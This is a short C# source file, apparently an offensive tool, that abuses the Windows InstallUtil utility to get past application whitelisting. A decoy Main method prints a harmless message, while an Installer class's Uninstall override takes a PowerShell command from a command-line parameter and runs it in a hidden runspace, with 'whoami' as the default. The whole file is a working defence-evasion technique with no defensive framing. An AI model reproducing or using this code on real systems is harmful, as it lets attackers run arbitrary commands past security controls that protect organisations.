//load Automation.dll on C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Decoy Main Method");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // Captura o parâmetro 'cmd' passado na linha de comando do InstallUtil
            string payload = Context.Parameters["cmd"];

            if (string.IsNullOrEmpty(payload))
            {
                // Payload padrão caso nenhum seja passado
                payload = "whoami";
            }

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(payload);
            ps.Invoke();

            rs.Close();
        }
    }
}